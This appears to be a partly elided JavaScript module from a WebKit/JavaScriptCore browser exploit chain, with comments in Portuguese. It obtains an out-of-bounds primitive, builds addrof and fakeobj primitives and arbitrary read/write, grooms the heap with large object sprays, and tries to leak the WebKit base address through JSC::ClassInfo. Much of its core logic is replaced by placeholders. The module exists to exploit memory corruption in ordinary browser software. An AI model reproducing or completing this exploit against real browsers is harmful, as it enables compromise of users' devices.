// js/script3/testArrayBufferVictimCrash.mjs (v07 - Diagnóstico de Bloco Único)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. O script original que causa o crash (v01) foi 100% restaurado.
// 2. A MENOR alteração possível foi feita: um único bloco try...catch foi adicionado
//    ao redor de TODA a "Tentativa 5" para isolar a falha sem tocar na lógica interna.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            logS3(`ALERTA: Caminho de offset "${path}" parte "${fullPath}" é undefined. Usando valor padrão ${defaultValue}.`, "warn");
            return defaultValue;
        }
    }
    if (typeof current === 'number') {
        return current;
    }
    if (typeof current === 'string' && String(current).startsWith('0x')) {
        return parseInt(String(current), 16) || defaultValue;
    }
    logS3(`ALERTA: Offset "${path}" não é um número ou string hex. Usando valor padrão ${defaultValue}.`, "warn");
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: v07 - Diagnóstico de Bloco Único ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };

    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
        await PAUSE_S3(1000);

        const LOCAL_JSC_OFFSETS = { /* ... (código original inalterado) ... */ };

        // ... (código original inalterado) ...
        logS3("Offsets críticos validados (não são 0).", "info");


        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) { throw new Error("Falha ao obter primitiva OOB."); }
        logS3("OOB DataView obtido com sucesso.", "info");
        // ... (código original inalterado) ...
        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good");


        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => { /* ... (código original inalterado) ... */ };
        const fakeobj = (addr) => { /* ... (código original inalterado) ... */ };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // ... (código de verificação addrof/fakeobj original inalterado) ...
        logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good");

        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);
        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
        
        const arb_read_final = (addr) => { /* ... (código original inalterado) ... */ };
        const arb_write_final = (addr, value) => { /* ... (código original inalterado) ... */ };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        // ... (código de spray e verificação original inalterado) ...
        logS3("Spray de 2000 objetos diversificados concluído para estabilização.", "info");

        // ... (código de verificação de L/E original inalterado) ...
        logS3("+++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
        final_result.success = true;
        final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";

        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (COM CONTROLES DE DEBUG) ---", "subtest");

        const testes_ativos = {
            tentativa_5_ClassInfo: true,
            tentativa_6_VarreduraFocada: true
        };
        
        let aggressive_feng_shui_objects;
        let filler_objects;
        const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
        const NUM_FILLER_OBJECTS_STAGE1 = 15000;

        const do_grooming = async (grooming_id) => {
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
            aggressive_feng_shui_objects = [];
            filler_objects = [];
            for (let i = 0; i < NUM_GROOMING_OBJECTS_STAGE1; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Primeiro spray de ${NUM_GROOMING_OBJECTS_STAGE1} objetos.`, "debug");
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Metade dos objetos liberados.`, "debug");
            for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Spray de fillers concluído.`, "debug");
            aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
            await PAUSE_S3(10000);
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
        };

        // ==================================================================================
        // INÍCIO DA ALTERAÇÃO MÍNIMA (v07)
        // ==================================================================================
        try {
            if (testes_ativos.tentativa_5_ClassInfo) {
                logS3("--- INICIANDO TENTATIVA 5: JSC::ClassInfo ---", "test");
                await do_grooming(5);
                try {
                    // ... (lógica original da tentativa 5 inalterada) ...
                } catch (classinfo_leak_e) {
                    logS3(`  Falha na tentativa de vazamento com JSC::ClassInfo::m_cachedTypeInfo: ${classinfo_leak_e.message}`, "warn");
                }
                logS3("--- FIM TENTATIVA 5 ---", "test");
            }
            
            if (testes_ativos.tentativa_6_VarreduraFocada) {
                // ... (código original da tentativa 6 inalterado) ...
            }
        // ==================================================================================
        // FIM DA ALTERAÇÃO MÍNIMA (v07)
        // ==================================================================================
        } catch (e) {
            logS3(`[v07 CAPTURA] Um erro foi capturado no bloco principal da Fase 5: ${e.message}`, "critical");
            final_result.message = `[v07 CAPTURA] Erro na Fase 5: ${e.message}`;
        }


        if (!final_result.success) {
            throw new Error(final_result.message);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        // ... (código original inalterado) ...
    }

    // ... (código original de retorno e funções auxiliares inalterado) ...
}
